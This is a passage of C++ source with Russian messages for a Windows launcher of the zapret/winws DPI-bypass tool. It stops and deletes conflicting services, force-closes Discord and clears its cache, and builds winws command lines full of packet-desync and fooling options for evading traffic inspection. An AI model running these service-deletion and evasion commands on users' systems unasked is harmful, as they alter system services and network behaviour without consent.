                        std::wstring output2 = L"";
                        
                        while (fgetws(buffer, sizeof(buffer), pipe2) != NULL) {
                            output2 += buffer;
                        }
                        _pclose(pipe2);
                        
                        if (output2.find(service) != std::wstring::npos) {
                            PrintYellow("[?] Обнаружен конфликтующий сервис: " + WStringToString(service) + ". Остановка и удаление...");
                            _wsystem((L"net stop \"" + service + L"\"").c_str());
                            _wsystem((L"sc delete \"" + service + L"\"").c_str());
                            
                            pipe2 = _wpopen((L"sc query \"" + service + L"\"").c_str(), L"r");
                            if (pipe2) {
                                wchar_t buffer2[128];
                                std::wstring output3 = L"";
                                
                                while (fgetws(buffer2, sizeof(buffer2), pipe2) != NULL) {
                                    output3 += buffer2;
                                }
                                _pclose(pipe2);
                                
                                if (output3.find(service) == std::wstring::npos) {
                                    PrintGreen("Сервис успешно удален: " + WStringToString(service));
                                } else {
                                    PrintRed("[X] Не удалось удалить сервис: " + WStringToString(service));
                                }
                            }
                            found_conflict = true;
                        }
                    }
                }
                
                if (!found_conflict) {
                    PrintRed("[X] Конфликтующие сервисы не найдены. Проверьте вручную, не использует ли другой обход WinDivert.");
                } else {
                    PrintYellow("[?] Повторная попытка удаления WinDivert...");
                    
                    _wsystem(L"sc delete \"WinDivert\"");
                    
                    pipe = _wpopen(L"sc query WinDivert", L"r");
                    if (pipe) {
                        wchar_t buffer[128];
                        std::wstring output4 = L"";
                        
                        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
                            output4 += buffer;
                        }
                        _pclose(pipe);
                        
                        if (output4.find(L"WinDivert") == std::wstring::npos) {
                            PrintGreen("WinDivert успешно удален после удаления конфликтующих сервисов.");
                        } else {
                            PrintRed("[X] WinDivert по-прежнему не может быть удален. Проверьте вручную, не использует ли другой обход WinDivert.");
                        }
                    }
                }
            }
        } else {
            PrintGreen("WinDivert успешно удален.");
        }
    }
    
    // Проверка конфликтующих сервисов
    std::vector<std::wstring> conflicting_services = {L"GoodbyeDPI", L"discordfix_zapret", L"winws1", L"winws2"};
    std::wstring found_conflicts;
    
    for (const auto& service : conflicting_services) {
        FILE* pipe2 = _wpopen((L"sc query \"" + service + L"\"").c_str(), L"r");
        if (pipe2) {
            wchar_t buffer[128];
            std::wstring output = L"";
            
            while (fgetws(buffer, sizeof(buffer), pipe2) != NULL) {
                output += buffer;
            }
            _pclose(pipe2);
            
            if (output.find(service) != std::wstring::npos) {
                if (!found_conflicts.empty()) {
                    found_conflicts += L" ";
                }
                found_conflicts += service;
            }
        }
    }
    
    if (!found_conflicts.empty()) {
        PrintRed("[X] Обнаружены конфликтующие сервисы обхода: " + WStringToString(found_conflicts));
        
        std::cout << "Вы хотите удалить эти конфликтующие сервисы? (Y/N) (по умолчанию: N): ";
        std::string choice;
        std::cin >> choice;
        
        if (choice == "Y" || choice == "y") {
            for (const auto& service : conflicting_services) {
                PrintYellow("Остановка и удаление сервиса: " + WStringToString(service));
                _wsystem((L"net stop \"" + service + L"\"").c_str());
                _wsystem((L"sc delete \"" + service + L"\"").c_str());
                
                FILE* pipe2 = _wpopen((L"sc query \"" + service + L"\"").c_str(), L"r");
                if (pipe2) {
                    wchar_t buffer[128];
                    std::wstring output = L"";
                    
                    while (fgetws(buffer, sizeof(buffer), pipe2) != NULL) {
                        output += buffer;
                    }
                    _pclose(pipe2);
                    
                    if (output.find(service) == std::wstring::npos) {
                        PrintGreen("Сервис успешно удален: " + WStringToString(service));
                    } else {
                        PrintRed("[X] Не удалось удалить сервис: " + WStringToString(service));
                    }
                }
            }
            
            _wsystem(L"net stop \"WinDivert\"");
            _wsystem(L"sc delete \"WinDivert\"");
            _wsystem(L"net stop \"WinDivert14\"");
            _wsystem(L"sc delete \"WinDivert14\"");
        }
    }
    
    // Очистка кэша Discord
    std::cout << "Вы хотите очистить кэш Discord? (Y/N) (по умолчанию: Y): ";
    std::string choice;
    std::cin >> choice;
    
    if (choice.empty() || choice == "Y" || choice == "y") {
        // Проверяем, запущен ли Discord
        FILE* pipe = _wpopen(L"tasklist /FI \"IMAGENAME eq Discord.exe\"", L"r");
        if (pipe) {
            wchar_t buffer[128];
            std::wstring output = L"";
            
            while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
                output += buffer;
            }
            _pclose(pipe);
            
            if (output.find(L"Discord.exe") != std::wstring::npos) {
                PrintYellow("Discord запущен, закрытие...");
                _wsystem(L"taskkill /IM Discord.exe /F");
                
                if (GetLastError() == 0) {
                    PrintGreen("Discord успешно закрыт.");
                } else {
                    PrintRed("Не удалось закрыть Discord.");
                }
            }
        }
        
        // Получаем путь к кэшу Discord
        wchar_t* appData;
        size_t len;
        _wdupenv_s(&appData, &len, L"APPDATA");
        std::wstring discordCacheDir = std::wstring(appData) + L"\\discord";
        free(appData);
        
        // Удаляем папки кэша
        std::vector<std::wstring> cacheDirs = {L"Cache", L"Code Cache", L"GPUCache"};
        
        for (const auto& dir : cacheDirs) {
            std::wstring dirPath = discordCacheDir + L"\\" + dir;
            
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFileW((dirPath + L"\\*").c_str(), &findData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                bool deleted = false;
                
                do {
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        std::wstring filePath = dirPath + L"\\" + findData.cFileName;
                        
                        if (DeleteFileW(filePath.c_str())) {
                            deleted = true;
                        }
                    }
                } while (FindNextFileW(hFind, &findData));
                
                FindClose(hFind);
                
                if (deleted && RemoveDirectoryW(dirPath.c_str())) {
                    PrintGreen("Успешно удалено: " + WStringToString(dirPath));
                } else {
                    PrintRed("Не удалось удалить: " + WStringToString(dirPath));
                }
            } else {
                PrintRed("Папка не существует: " + WStringToString(dirPath));
            }
        }
    }
    std::cout << "\nПроверка процесса winws.exe и драйвера WinDivert64.sys:\n";
    std::wstring exeDir = GetExePath();
    std::wstring binPath = exeDir + L"\\bin";
    FindAndTerminateWinwsProcess(binPath);
    IsWinDivertDriverLoaded();
    std::vector<std::wstring> requiredFiles = {
        binPath + L"\\winws.exe",
        binPath + L"\\quic_initial_www_google_com.bin",
        binPath + L"\\tls_clienthello_www_google_com.bin",
        exeDir + L"\\lists\\list-general.txt",
        exeDir + L"\\lists\\ipset-all.txt"
    };
    
    bool allFilesExist = true;
    for (const auto& file : requiredFiles) {
        if (GetFileAttributesW(file.c_str()) == INVALID_FILE_ATTRIBUTES) {
            PrintRed("[X] Файл не найден: " + WStringToString(file));
            allFilesExist = false;
        }
    }
    
    if (allFilesExist) {
        PrintGreen("Все необходимые файлы присутствуют.");
    }
}

void ReadSettings() {
    std::ifstream file(settingsFile);
    if (file.is_open()) {
        std::string line;
        while (std::getline(file, line)) {
            size_t pos = line.find(":");
            if (pos != std::string::npos) {
                std::string key = line.substr(0, pos);
                std::string value = line.substr(pos + 1);

                key.erase(remove_if(key.begin(), key.end(), isspace), key.end());
                value.erase(remove_if(value.begin(), value.end(), isspace), value.end());
                if (!value.empty() && value.front() == '"') value.erase(0, 1);
                if (!value.empty() && value.back() == '"') value.pop_back();
                
                if (key == "service_installed") {
                    currentSettings.service_installed = (value == "true");
                } else if (key == "ipset_enabled") {
                    currentSettings.ipset_enabled = (value == "true");
                } else if (key == "game_enabled") {
                    currentSettings.game_enabled = (value == "true");
                } else if (key == "current_alt") {
                    currentSettings.current_alt = std::stoi(value);
                } else if (key == "last_run_mode") {
                    currentSettings.last_run_mode = value;
                }
            }
        }
        file.close();
    }
}

void WriteSettings() {
    std::ofstream file(settingsFile);
    if (file.is_open()) {
        file << "{\n";
        file << "  \"service_installed\": " << (currentSettings.service_installed ? "true" : "false") << ",\n";
        file << "  \"ipset_enabled\": " << (currentSettings.ipset_enabled ? "true" : "false") << ",\n";
        file << "  \"game_enabled\": " << (currentSettings.game_enabled ? "true" : "false") << ",\n";
        file << "  \"current_alt\": " << currentSettings.current_alt << ",\n";
        file << "  \"last_run_mode\": \"" << currentSettings.last_run_mode << "\"\n";
        file << "}\n";
        file.close();
    }
}

void RunWinws(const std::wstring& exeDir, int choice) {
    std::wstring BIN = exeDir + L"\\bin";
    std::wstring LISTS = exeDir + L"\\lists";
    
    // Объявляем переменные здесь, чтобы они были видны во всех case
    std::wstring cmdFilePath;
    std::wofstream cmdFile;
    
    // Проверяем существование директорий
    if (GetFileAttributesW(BIN.c_str()) == INVALID_FILE_ATTRIBUTES) {
        PrintRed("Ошибка: директория " + WStringToString(BIN) + " не существует.");
        LogError(exeDir, "Ошибка: директория bin не существует: " + WStringToString(BIN));
        return;
    }
    
    if (GetFileAttributesW(LISTS.c_str()) == INVALID_FILE_ATTRIBUTES) {
        PrintRed("Ошибка: директория " + WStringToString(LISTS) + " не существует.");
        LogError(exeDir, "Ошибка: директория lists не существует: " + WStringToString(LISTS));
        return;
    }
    
    // Проверяем наличие необходимых файлов
    std::vector<std::wstring> requiredFiles = {
        BIN + L"\\winws.exe",
        BIN + L"\\quic_initial_www_google_com.bin",
        BIN + L"\\tls_clienthello_www_google_com.bin",
        LISTS + L"\\list-general.txt",
        LISTS + L"\\ipset-all.txt"
    };
    
    for (const auto& file : requiredFiles) {
        if (GetFileAttributesW(file.c_str()) == INVALID_FILE_ATTRIBUTES) {
            PrintRed("Ошибка: необходимый файл не найден: " + WStringToString(file));
            LogError(exeDir, "Ошибка: необходимый файл не найден: " + WStringToString(file));
            return;
        }
    }
    
    // Проверяем наличие конфликтующих программ
    FILE* pipe = _wpopen(L"tasklist /FI \"IMAGENAME eq winws.exe\"", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"winws.exe") != std::wstring::npos) {
            PrintYellow("Предупреждение: обнаружен уже запущенный процесс winws.exe. Попытка завершения...");
            _wsystem(L"taskkill /IM winws.exe /F");
        }
    }
    
    // Проверяем, запущен ли сервис
    pipe = _wpopen(L"sc query zapret", L"r");
    if (pipe) {
        wchar_t buffer[128];
        std::wstring output = L"";
        
        while (fgetws(buffer, sizeof(buffer), pipe) != NULL) {
            output += buffer;
        }
        _pclose(pipe);
        
        if (output.find(L"RUNNING") != std::wstring::npos) {
            PrintRed("Сервис zapret уже запущен. Сначала удалите сервис, если хотите запустить автономный .bat файл.");
            return;
        }
    }
    
    // Безопасно получаем значение GameFilter из переменной окружения
    wchar_t* gameFilterValue = nullptr;
    size_t len = 0;
    errno_t err = _wdupenv_s(&gameFilterValue, &len, L"GameFilter");
    std::wstring GameFilter;
    
    if (err == 0 && gameFilterValue != nullptr) {
        GameFilter = gameFilterValue;
        free(gameFilterValue);
        
        // Проверяем, что GameFilter содержит только цифры и дефисы
        for (wchar_t c : GameFilter) {
            if (!iswdigit(c) && c != L'-') {
                PrintRed("Недопустимые символы в переменной GameFilter. Используется значение по умолчанию.");
                GameFilter = L"12";
                break;
            }
        }
    } else {
        GameFilter = L"12"; // Значение по умолчанию
    }
    
    // Если GAME фильтр включен, используем расширенный диапазон
    if (currentSettings.game_enabled) {
        GameFilter = L"1024-65535";
    }
    
    // Создаем директорию для логов, если она не существует
    std::wstring logDir = exeDir + L"\\log";
    if (GetFileAttributesW(logDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryW(logDir.c_str(), NULL);
    }
    
    // Формируем команду в зависимости от выбора
    std::wostringstream command;
    command << L"cmd /C \"";
    
    // Добавляем команду запуска winws.exe
    command << L"\"" << BIN << L"\\winws.exe\" ";
    
    switch (choice) {
        case 1: // ALT1
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=5 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=5 --dpi-desync-repeats=6 --dpi-desync-fooling=badseq --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 2: // ALT2
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=652 --dpi-desync-split-pos=2 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=652 --dpi-desync-split-pos=2 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 3: // ALT3
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 4: // ALT4
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-repeats=6 --dpi-desync-fooling=md5sig --dpi-desync-fake-tls=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 5: // ALT5
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-l3=ipv4 --filter-tcp=443," << GameFilter << L" --dpi-desync=syndata --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=14 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n3";
            break;
            
        case 6: // ALT6
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 7: // FAKE TLS ALT1
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-fooling=md5sig --dpi-desync-fake-tls-mod=rnd,rndsni,padencap --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 8: // FAKE TLS AUTO ALT1
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-split-pos=1 --dpi-desync-autottl --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 9: // FAKE TLS AUTO ALT2
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                    << L"--filter-udp=443 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-tcp=80 --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
                    << L"--filter-tcp=443," << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake,multisplit --dpi-desync-split-seqovl=681 --dpi-desync-split-pos=1 --dpi-desync-fooling=badseq --dpi-desync-repeats=8 --dpi-desync-split-seqovl-pattern=\"" << BIN << L"\\tls_clienthello_www_google_com.bin\" --dpi-desync-fake-tls-mod=rnd,dupsid,sni=www.google.com --new "
                    << L"--filter-udp=" << GameFilter << L" --ipset=\"" << LISTS << L"\\ipset-all.txt\" --dpi-desync=fake --dpi-desync-autottl=2 --dpi-desync-repeats=10 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --dpi-desync-cutoff=n2";
            break;
            
        case 10: // FAKE TLS AUTO
            command << L"--wf-tcp=80,443," << GameFilter << L" "
                    << L"--wf-udp=443,50000-50100," << GameFilter << L" "
                    << L"--filter-udp=443 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake --dpi-desync-repeats=11 --dpi-desync-fake-quic=\"" << BIN << L"\\quic_initial_www_google_com.bin\" --new "
                    << L"--filter-udp=50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-repeats=6 --new "
                    << L"--filter-tcp=80 --hostlist=\"" << LISTS << L"\\list-general.txt\" --dpi-desync=fake,fakedsplit --dpi-desync-autottl=2 --dpi-desync-fooling=md5sig --new "
